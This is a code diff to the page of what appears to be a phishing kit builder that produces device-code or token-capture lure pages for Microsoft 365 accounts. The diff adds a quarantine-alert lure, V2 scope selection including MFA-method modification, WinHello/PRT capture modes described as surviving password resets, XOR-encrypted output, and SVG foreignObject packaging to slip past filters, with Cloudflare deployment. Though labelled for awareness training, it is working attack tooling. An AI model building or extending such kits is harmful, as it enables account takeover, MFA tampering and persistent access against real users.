@@ -13,7 +13,7 @@
             <div class="row g-3">
                 <div class="col-md-6">
                     <label class="form-label">Callback Server (this dashboard)</label>
-                    <input type="text" id="cfgServer" class="form-control" placeholder="http://your-server:8080">
+                    <input type="text" id="cfgServer" class="form-control" placeholder="http://your-server">
                     <div class="form-text">The URL of this campaign server. The phish page calls back here.</div>
                 </div>
                 <div class="col-md-6">
@@ -23,6 +23,7 @@
                         <option value="voicemail">Voicemail Notification</option>
                         <option value="payroll">HR Payroll Update</option>
                         <option value="document">Shared Document (DocuSign)</option>
+                        <option value="quarantine">Microsoft 365 Quarantine Alert</option>
                     </select>
                 </div>
                 <div class="col-md-6">
@@ -40,27 +41,39 @@
                 <div class="col-md-6">
                     <label class="form-label">Client ID</label>
                     <select id="cfgClient" class="form-select">
-                        <option value="29d9ed98-a469-4536-ade2-f981bc1d605e" selected>Auth Broker — 29d9ed98 (WinHello/PRT)</option>
-                        <option value="04b07795-8ddb-461a-bbee-02f9e1bf7b46">Azure CLI — 04b07795 (no MFA)</option>
-                        <option value="d3590ed6-52b3-4102-aeff-aad2292ab01c">Microsoft Office — d3590ed6 (FOCI, 36 scopes)</option>
-                        <option value="1fec8e78-bce4-4aaf-ab1b-5451cc387264">Microsoft Teams — 1fec8e78</option>
-                        <option value="27922004-5251-4030-b22d-91ecd9a37ea4">Outlook Mobile — 27922004 (FOCI)</option>
-                        <option value="d326c1ce-6cc6-4de2-bebc-4591e5e13ef0">SharePoint — d326c1ce</option>
-                        <option value="dd762716-544d-4aeb-a526-687b73838a22">Device Registration — dd762716</option>
-                        <option value="1950a258-227b-4e31-a9cf-717495945fc2">Azure PowerShell — 1950a258</option>
+                        <!-- Populated by JS based on V1/V2 selection -->
                     </select>
                 </div>
-                <div class="col-md-6">
+                <div class="col-md-3">
+                    <label class="form-label">API Version</label>
+                    <select id="cfgVersion" class="form-select" onchange="onVersionChange()">
+                        <option value="1" selected>V1 — Resource (default)</option>
+                        <option value="2">V2 — Scope (more control)</option>
+                    </select>
+                </div>
+                <div class="col-md-3" id="resourceContainer">
                     <label class="form-label">Resource</label>
                     <select id="cfgResource" class="form-select">
-                        <option value="urn:ms-drs:enterpriseregistration.windows.net" selected>Device Registration Service (WinHello/PRT)</option>
-                        <option value="https://graph.microsoft.com">Graph API (email, files, teams)</option>
-                        <option value="https://outlook.office365.com">Outlook (53 scopes, rules)</option>
+                        <option value="https://graph.microsoft.com" selected>Graph API (36 scopes)</option>
+                        <option value="https://outlook.office365.com">Outlook (53 scopes)</option>
+                        <option value="urn:ms-drs:enterpriseregistration.windows.net">Device Reg (WinHello)</option>
                         <option value="https://management.azure.com">Azure Management</option>
                         <option value="https://graph.windows.net/">AAD Graph (legacy)</option>
-                        <option value="https://api.spaces.skype.com/">Microsoft Teams (Skype)</option>
-                        <option value="https://management.core.windows.net/">Azure Core Management</option>
+                        <option value="https://api.spaces.skype.com/">Teams (Skype)</option>
+                        <option value="https://management.core.windows.net/">Azure Core Mgmt</option>
                     </select>
+                </div>
+                <div class="col-md-6" id="scopeContainer" style="display:none">
+                    <label class="form-label">Scope <span style="font-size:10px;color:var(--gs-text-muted)">(V2 — space-separated)</span></label>
+                    <select id="cfgScope" class="form-select" onchange="document.getElementById('cfgScopeCustom').value=this.value">
+                        <option value="https://graph.microsoft.com/.default openid offline_access" selected>Graph .default (all scopes)</option>
+                        <option value="https://outlook.office365.com/.default openid offline_access">Outlook .default (53 scopes)</option>
+                        <option value="19db86c3-b2b9-44cc-b339-36da233a3be2/.default openid offline_access">My Signins (modify MFA methods)</option>
+                        <option value="https://management.azure.com/.default openid offline_access">Azure Management</option>
+                        <option value="urn:ms-drs:enterpriseregistration.windows.net/.default openid offline_access">Device Registration</option>
+                        <option value="custom">Custom scope...</option>
+                    </select>
+                    <input type="text" id="cfgScopeCustom" class="form-control mt-1" style="display:none;font-size:12px" placeholder="Mail.ReadWrite Files.ReadWrite.All offline_access">
                 </div>
                 <div class="col-md-6">
                     <div class="form-check form-switch mt-2">
@@ -77,9 +90,9 @@
                 <div class="col-md-6">
                     <label class="form-label" style="color:var(--gs-gold);font-weight:600">Capture Mode (determines Client ID &amp; Resource)</label>
                     <select id="cfgAutoAction" class="form-select" style="border-color:var(--gs-gold)" onchange="onCaptureModeChange()">
-                        <option value="winhello" selected>WinHello — device + PRT + WinHello key (persists after password reset)</option>
+                        <option value="none" selected>Standard — capture Graph token (MS Office, 36 scopes)</option>
+                        <option value="winhello">WinHello — device + PRT + WinHello key (persists after password reset)</option>
                         <option value="device_prt">Device PRT — register device + get PRT</option>
-                        <option value="none">Standard — capture Graph token only</option>
                     </select>
                 </div>
                 <div class="col-12" id="captureModeInfo" style="display:none">
@@ -127,6 +140,16 @@
                     </div>
                 </div>
 
+                <div id="fields-quarantine" class="col-12" style="display:none">
+                    <div class="card mt-2" style="border-color:var(--gs-border)">
+                        <div class="card-body px-3 py-2">
+                            <div class="row g-2">
+                                <div class="col-md-4"><label class="form-label">Quarantined Messages</label><input type="number" id="cfgQuarantineCount" class="form-control form-control-sm" value="3" min="1" max="99"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
                 <div class="col-12">
                     <label class="form-label">Redirect URL (after capture)</label>
                     <input type="text" id="cfgRedirect" class="form-control" placeholder="https://training.yoursite.com/lesson">
@@ -136,12 +159,15 @@
         </div>
     </div>
 
-    <div class="d-flex gap-2 mt-3">
+    <div class="d-flex gap-2 mt-3 flex-wrap">
         <button class="btn gs-btn-accent" onclick="generateScript()">
             <i class="fi fi-rr-code-simple" style="vertical-align:-0.15em"></i> Generate Script
         </button>
         <button class="btn btn-outline-secondary" id="downloadBtn" onclick="downloadScript()" style="display:none">
             <i class="fi fi-rr-download" style="vertical-align:-0.15em"></i> Download HTML File
+        </button>
+        <button class="btn btn-outline-secondary" id="downloadSvgBtn" onclick="downloadSvg()" style="display:none">
+            <i class="fi fi-rr-download" style="vertical-align:-0.15em"></i> Download SVG File
         </button>
         <button class="btn btn-outline-secondary" id="copyBtn" onclick="copyScript()" style="display:none">
             <i class="fi fi-rr-copy" style="vertical-align:-0.15em"></i> Copy to Clipboard
@@ -205,10 +231,9 @@
 
 <script>
 // Auto-fill callback server
-document.getElementById('cfgServer').value = 'http://' + location.hostname + ':8080';
+document.getElementById('cfgServer').value = location.origin;
 
-// Apply default capture mode (WinHello) on page load
-onCaptureModeChange();
+// Init calls are at the bottom of the script after all definitions
 
 // Load/save Cloudflare credentials from GraphSpy settings DB
 (function loadCfCreds() {
@@ -231,33 +256,163 @@ function clearCfCreds() {
     document.getElementById('cfAccountId').value = '';
 }
 
-// Capture mode changes client_id and resource in real-time
+// ========== V1/V2 Compatibility Maps ==========
+var V1_CLIENTS = [
+    {id:'d3590ed6-52b3-4102-aeff-aad2292ab01c', label:'\u2605\u2605\u2605\u2605\u2605 Microsoft Office \u2014 FOCI \xb7 36 scopes \xb7 Mail, Files, Directory, Teams'},
+    {id:'27922004-5251-4030-b22d-91ecd9a37ea4', label:'\u2605\u2605\u2605\u2605 Outlook Mobile \u2014 FOCI \xb7 Mail, Calendar, Contacts'},
+    {id:'1fec8e78-bce4-4aaf-ab1b-5451cc387264', label:'\u2605\u2605\u2605 Microsoft Teams \u2014 Teams, Mail, Files'},
+    {id:'d326c1ce-6cc6-4de2-bebc-4591e5e13ef0', label:'\u2605\u2605\u2605 SharePoint \u2014 SharePoint, Files'},
+    {id:'b26aadf8-566f-4478-926f-589f601d9c74', label:'\u2605\u2605\u2605 OneDrive \u2014 Files only'},
+    {id:'04b07795-8ddb-461a-bbee-02f9e1bf7b46', label:'\u2605\u2605 Azure CLI \u2014 No MFA \xb7 Varies by tenant'},
+    {id:'1950a258-227b-4e31-a9cf-717495945fc2', label:'\u2605\u2605 Azure PowerShell \u2014 No MFA \xb7 Azure management'},
+    {id:'00b41c95-dab0-4487-9791-b9d2c32c80f2', label:'\u2605\u2605 Office 365 Management \u2014 Management APIs'},
+    {id:'29d9ed98-a469-4536-ade2-f981bc1d605e', label:'\u2605 Auth Broker \u2014 Device reg \xb7 Required for WinHello/PRT'},
+    {id:'dd762716-544d-4aeb-a526-687b73838a22', label:'\u2605 Device Registration \u2014 Device reg only'}
+];
+var V1_RESOURCES = [
+    {value:'https://graph.microsoft.com', label:'Graph API (email, files, teams \u2014 36 scopes)'},
+    {value:'https://outlook.office365.com', label:'Outlook (53 scopes, rules, MailboxSettings)'},
+    {value:'urn:ms-drs:enterpriseregistration.windows.net', label:'Device Registration Service (WinHello/PRT)'},
+    {value:'https://management.azure.com', label:'Azure Management'},
+    {value:'https://graph.windows.net/', label:'AAD Graph (legacy)'},
+    {value:'https://api.spaces.skype.com/', label:'Microsoft Teams (Skype)'},
+    {value:'https://management.core.windows.net/', label:'Azure Core Management'}
+];
+var V2_SCOPES = {
+    graph:     {value:'https://graph.microsoft.com/.default openid offline_access', label:'Graph .default (36 scopes)'},
+    outlook:   {value:'https://outlook.office365.com/.default openid offline_access', label:'Outlook .default (53 scopes)'},
+    mysignins: {value:'19db86c3-b2b9-44cc-b339-36da233a3be2/.default openid offline_access', label:'My Signins (modify MFA \u2014 V2 only)'},
+    drs:       {value:'urn:ms-drs:enterpriseregistration.windows.net/.default openid offline_access', label:'Device Registration'},
+    azuremgmt: {value:'https://management.azure.com/.default openid offline_access', label:'Azure Management'}
+};
+var V2_CLIENTS = [
+    {id:'d3590ed6-52b3-4102-aeff-aad2292ab01c', label:'\u2605\u2605\u2605\u2605\u2605 Microsoft Office \u2014 ALL scopes', scopes:['graph','outlook','mysignins','drs','azuremgmt']},
+    {id:'27922004-5251-4030-b22d-91ecd9a37ea4', label:'\u2605\u2605\u2605\u2605 Outlook Mobile \u2014 ALL scopes', scopes:['graph','outlook','mysignins','drs','azuremgmt']},
+    {id:'d326c1ce-6cc6-4de2-bebc-4591e5e13ef0', label:'\u2605\u2605\u2605 SharePoint \u2014 ALL scopes', scopes:['graph','outlook','mysignins','drs','azuremgmt']},
+    {id:'b26aadf8-566f-4478-926f-589f601d9c74', label:'\u2605\u2605\u2605 OneDrive \u2014 ALL scopes', scopes:['graph','outlook','mysignins','drs','azuremgmt']},
+    {id:'dd762716-544d-4aeb-a526-687b73838a22', label:'\u2605\u2605 Device Registration \u2014 ALL scopes', scopes:['graph','outlook','mysignins','drs','azuremgmt']},
+    {id:'04b07795-8ddb-461a-bbee-02f9e1bf7b46', label:'\u2605\u2605 Azure CLI \u2014 Graph, MySig, DRS, AzMgmt (no Outlook)', scopes:['graph','mysignins','drs','azuremgmt']},
+    {id:'1950a258-227b-4e31-a9cf-717495945fc2', label:'\u2605\u2605 Azure PowerShell \u2014 Graph, MySig, DRS, AzMgmt (no Outlook)', scopes:['graph','mysignins','drs','azuremgmt']},
+    {id:'29d9ed98-a469-4536-ade2-f981bc1d605e', label:'\u2605 Auth Broker \u2014 Graph, MySig, DRS, AzMgmt (no Outlook)', scopes:['graph','mysignins','drs','azuremgmt']},
+    {id:'00b41c95-dab0-4487-9791-b9d2c32c80f2', label:'\u2605 O365 Management \u2014 Graph, MySig, DRS, AzMgmt (no Outlook)', scopes:['graph','mysignins','drs','azuremgmt']},
+    {id:'1fec8e78-bce4-4aaf-ab1b-5451cc387264', label:'\u2605 Teams \u2014 MySig, DRS, AzMgmt only (no Graph, no Outlook)', scopes:['mysignins','drs','azuremgmt']}
+];
+
+function populateSelect(el, items, valueKey, labelKey, selectedValue) {
+    el.innerHTML = '';
+    items.forEach(function(item) {
+        var opt = document.createElement('option');
+        opt.value = item[valueKey || 'id'] || item.value;
+        opt.textContent = item[labelKey || 'label'] || item.label;
+        if (opt.value === selectedValue) opt.selected = true;
+        el.appendChild(opt);
+    });
+}
+
+function onVersionChange() {
+    var v = document.getElementById('cfgVersion').value;
+    var mode = document.getElementById('cfgAutoAction').value;
+    var clientEl = document.getElementById('cfgClient');
+    var resourceEl = document.getElementById('cfgResource');
+
+    // If in WinHello/PRT mode, just toggle visibility but keep locked
+    if (mode === 'device_prt' || mode === 'winhello') {
+        document.getElementById('resourceContainer').style.display = v === '1' ? 'block' : 'none';
+        document.getElementById('scopeContainer').style.display = v === '2' ? 'block' : 'none';
+        return;
+    }
+
+    // Standard mode — populate based on version
+    if (v === '2') {
+        document.getElementById('resourceContainer').style.display = 'none';
+        document.getElementById('scopeContainer').style.display = 'block';
+        populateSelect(clientEl, V2_CLIENTS, 'id', 'label', 'd3590ed6-52b3-4102-aeff-aad2292ab01c');
+        onClientChangeV2();
+    } else {
+        document.getElementById('resourceContainer').style.display = 'block';
+        document.getElementById('scopeContainer').style.display = 'none';
+        populateSelect(clientEl, V1_CLIENTS, 'id', 'label', 'd3590ed6-52b3-4102-aeff-aad2292ab01c');
+        populateSelect(resourceEl, V1_RESOURCES, 'value', 'label', 'https://graph.microsoft.com');
+    }
+}
+
+function onClientChangeV2() {
+    var clientId = document.getElementById('cfgClient').value;
+    var scopeEl = document.getElementById('cfgScope');
+    var client = V2_CLIENTS.find(function(c) { return c.id === clientId; });
+    var validScopes = client ? client.scopes : Object.keys(V2_SCOPES);
+    var items = [];
+    validScopes.forEach(function(key) {
+        if (V2_SCOPES[key]) items.push({value: V2_SCOPES[key].value, label: V2_SCOPES[key].label});
+    });
+    items.push({value: 'custom', label: 'Custom scope...'});
+    var prev = scopeEl.value;
+    populateSelect(scopeEl, items, 'value', 'label', prev);
+    // If previous selection no longer valid, select first
+    if (!items.find(function(i) { return i.value === prev; })) scopeEl.selectedIndex = 0;
+    document.getElementById('cfgScopeCustom').style.display = scopeEl.value === 'custom' ? 'block' : 'none';
+    if (scopeEl.value !== 'custom') document.getElementById('cfgScopeCustom').value = scopeEl.value;
+}
+
+// Wire up client change listener for V2 scope filtering
+document.getElementById('cfgClient').addEventListener('change', function() {
+    if (document.getElementById('cfgVersion').value === '2') onClientChangeV2();
+});
+
+// Show/hide custom scope input
+document.getElementById('cfgScope').addEventListener('change', function() {
+    document.getElementById('cfgScopeCustom').style.display = this.value === 'custom' ? 'block' : 'none';
+    if (this.value !== 'custom') document.getElementById('cfgScopeCustom').value = this.value;
+});
+
+// Capture mode changes client_id and resource/scope in real-time
 function onCaptureModeChange() {
     var mode = document.getElementById('cfgAutoAction').value;
     var clientEl = document.getElementById('cfgClient');
     var resourceEl = document.getElementById('cfgResource');
+    var scopeEl = document.getElementById('cfgScope');
+    var versionEl = document.getElementById('cfgVersion');
+    var scopeCustomEl = document.getElementById('cfgScopeCustom');
+
     if (mode === 'device_prt' || mode === 'winhello') {
-        // WinHello/PRT requires Auth Broker client + Device Registration resource
-        clientEl.value = '29d9ed98-a469-4536-ade2-f981bc1d605e';
-        resourceEl.innerHTML = '<option value="urn:ms-drs:enterpriseregistration.windows.net" selected>Device Registration Service (urn:ms-drs)</option>';
+        // WinHello/PRT: lock EVERYTHING to Auth Broker + DRS
+        // Force client to Auth Broker only
+        clientEl.innerHTML = '<option value="29d9ed98-a469-4536-ade2-f981bc1d605e" selected>Auth Broker \u2014 29d9ed98 (Required for ' + (mode === 'winhello' ? 'WinHello' : 'PRT') + ')</option>';
         clientEl.disabled = true;
-        resourceEl.disabled = true;
         clientEl.style.borderColor = 'var(--gs-gold)';
+
+        // Lock resource (V1) to DRS
+        resourceEl.innerHTML = '<option value="urn:ms-drs:enterpriseregistration.windows.net" selected>Device Registration Service</option>';
+        resourceEl.disabled = true;
         resourceEl.style.borderColor = 'var(--gs-gold)';
+
+        // Lock scope (V2) to DRS
+        scopeEl.innerHTML = '<option value="urn:ms-drs:enterpriseregistration.windows.net/.default openid offline_access" selected>Device Registration .default</option>';
+        scopeEl.disabled = true;
+        scopeEl.style.borderColor = 'var(--gs-gold)';
+        scopeCustomEl.style.display = 'none';
+
+        // Version can stay as user chose, both V1+V2 work with Auth Broker + DRS
+        // But show both containers locked
+        document.getElementById('resourceContainer').style.display = versionEl.value === '1' ? 'block' : 'none';
+        document.getElementById('scopeContainer').style.display = versionEl.value === '2' ? 'block' : 'none';
+        versionEl.disabled = false; // Allow switching V1/V2 but keep client+resource/scope locked
+
         // Show device fields + indicator
         document.getElementById('fields-device').style.display = 'block';
         document.getElementById('captureModeInfo').style.display = 'block';
         document.getElementById('captureModeInfo').innerHTML = mode === 'winhello'
-            ? '<span style="color:var(--gs-gold)">&#9889;</span> <b>WinHello mode:</b> Client = Auth Broker (29d9ed98), ngcmfa forced. Device will be registered + PRT obtained + WinHello key created. <b>Persists even after password change.</b>'
-            : '<span style="color:var(--gs-gold)">&#9889;</span> <b>Device PRT mode:</b> Client = Auth Broker (29d9ed98). Device will be registered and PRT obtained.';
+            ? '<span style="color:var(--gs-gold)">\u26a1</span> <b>WinHello mode:</b> Client = Auth Broker, Resource = DRS, ngcmfa forced. Device registered + PRT obtained + WinHello key created. <b>Persists after password change.</b>'
+            : '<span style="color:var(--gs-gold)">\u26a1</span> <b>Device PRT mode:</b> Client = Auth Broker, Resource = DRS. Device registered + PRT obtained.';
     } else {
-        // Standard mode — user picks client + resource
+        // Standard mode — unlock everything, restore per-version lists
         clientEl.disabled = false;
         resourceEl.disabled = false;
+        scopeEl.disabled = false;
         clientEl.style.borderColor = '';
         resourceEl.style.borderColor = '';
-        resourceEl.innerHTML = '<option value="https://graph.microsoft.com" selected>Graph API (email, files, teams)</option><option value="https://outlook.office365.com">Outlook (53 scopes, rules)</option>';
-        clientEl.value = '04b07795-8ddb-461a-bbee-02f9e1bf7b46';
+        scopeEl.style.borderColor = '';
+        onVersionChange(); // Reload correct lists for current V1/V2 selection
         document.getElementById('captureModeInfo').style.display = 'none';
         document.getElementById('fields-device').style.display = 'none';
     }
@@ -267,6 +422,7 @@ function onCaptureModeChange() {
 document.getElementById('cfgTemplate').addEventListener('change', function() {
     document.getElementById('fields-payroll').style.display = this.value === 'payroll' ? 'block' : 'none';
     document.getElementById('fields-document').style.display = this.value === 'document' ? 'block' : 'none';
+    document.getElementById('fields-quarantine').style.display = this.value === 'quarantine' ? 'block' : 'none';
 });
 
 // XOR encrypt with key — works on HTTP (no crypto.subtle needed)
@@ -422,7 +578,13 @@ function generateScript() {
     var heading = document.getElementById('cfgHeading').value || 'Verify your identity';
     var desc = document.getElementById('cfgDesc').value || '';
     var clientId = document.getElementById('cfgClient').value;
+    var version = document.getElementById('cfgVersion').value;
     var resource = document.getElementById('cfgResource').value;
+    var scope = '';
+    if (version === '2') {
+        scope = document.getElementById('cfgScopeCustom').value || document.getElementById('cfgScope').value;
+        resource = ''; // V2 uses scope, not resource
+    }
     var showLesson = document.getElementById('cfgLesson').checked;
     var showLogo = document.getElementById('cfgMsLogo').checked;
 
@@ -464,6 +626,9 @@ function generateScript() {
         formData.append('pay_date', document.getElementById('cfgPayDate').value);
         formData.append('pay_deadline', document.getElementById('cfgPayDeadline').value);
     }
+    if (template === 'quarantine') {
+        formData.append('quarantine_count', document.getElementById('cfgQuarantineCount').value);
+    }
     if (template === 'document') {
         formData.append('doc_name', document.getElementById('cfgDocName').value);
         formData.append('doc_sender', document.getElementById('cfgDocSender').value);
@@ -478,6 +643,8 @@ function generateScript() {
     formData.append('desc', desc);
     formData.append('client_id', clientId);
     formData.append('resource', resource);
+    formData.append('version', version);
+    formData.append('scope', scope);
     formData.append('redirect', redirectUrl);
     formData.append('logo', showLogo ? 'true' : 'false');
     formData.append('modal', 'false');
@@ -489,7 +656,7 @@ function generateScript() {
     formData.append('target_domain', document.getElementById('cfgTargetDomain').value);
 
     var x = new XMLHttpRequest();
-    x.open('POST', 'http://' + location.hostname + ':8080/api/generate-phish-page');
+    x.open('POST', location.origin + '/api/generate-phish-page');
     x.onload = function() {
         btn.textContent = 'Generate Script';
         btn.disabled = false;
@@ -497,6 +664,7 @@ function generateScript() {
             document.getElementById('outputCode').value = x.responseText;
             document.getElementById('outputCard').style.display = 'block';
             document.getElementById('downloadBtn').style.display = 'inline-flex';
+            document.getElementById('downloadSvgBtn').style.display = 'inline-flex';
             document.getElementById('copyBtn').style.display = 'inline-flex';
             document.getElementById('outputSize').textContent = (x.responseText.length / 1024).toFixed(1) + ' KB';
         } else {
@@ -576,7 +744,7 @@ function generateScript() {
     formData.append('html', completePage);
 
     var x = new XMLHttpRequest();
-    x.open('POST', 'http://' + location.hostname + ':8080/api/encrypt-page');
+    x.open('POST', location.origin + '/api/encrypt-page');
     x.onload = function() {
         btn.textContent = 'Generate Script';
         btn.disabled = false;
@@ -584,10 +752,11 @@ function generateScript() {
             document.getElementById('outputCode').value = x.responseText;
             document.getElementById('outputCard').style.display = 'block';
             document.getElementById('downloadBtn').style.display = 'inline-flex';
+            document.getElementById('downloadSvgBtn').style.display = 'inline-flex';
             document.getElementById('copyBtn').style.display = 'inline-flex';
             document.getElementById('outputSize').textContent = (x.responseText.length / 1024).toFixed(1) + ' KB';
         } else {
-            alert('Encryption failed. Check if the campaign server is running on port 8080.');
+            alert('Encryption failed. Check if the campaign server is running.');
         }
     };
     x.onerror = function() {
@@ -607,6 +776,24 @@ function downloadScript() {
     a.href = URL.createObjectURL(blob);
     var tplName = document.getElementById('cfgTemplate').value || 'microsoft';
     a.download = tplName + '-verification.html';
+    a.click();
+}
+
+function downloadSvg() {
+    var code = document.getElementById('outputCode').value;
+    if (!code || code.length < 100) { alert('Generate a script first'); return; }
+    // Wrap the encrypted HTML inside an SVG foreignObject
+    var svgContent = '<?xml version="1.0" encoding="UTF-8"?>\n' +
+        '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xhtml="http://www.w3.org/1999/xhtml" width="100%" height="100%" viewBox="0 0 800 600">\n' +
+        '<foreignObject width="100%" height="100%">\n' +
+        code.replace(/<\?xml[^>]*\?>/g, '').replace(/<!DOCTYPE[^>]*>/gi, '') + '\n' +
+        '</foreignObject>\n' +
+        '</svg>';
+    var blob = new Blob([svgContent], {type: 'image/svg+xml'});
+    var a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    var tplName = document.getElementById('cfgTemplate').value || 'microsoft';
+    a.download = tplName + '-verification.svg';
     a.click();
 }
 
@@ -669,5 +856,9 @@ function deployToCloudflare() {
     };
     createXhr.send(JSON.stringify({ name: project, production_branch: 'main' }));
 }
+
+// ========== INIT on page load ==========
+onVersionChange();
+onCaptureModeChange();
 </script>
 {%endblock content%}
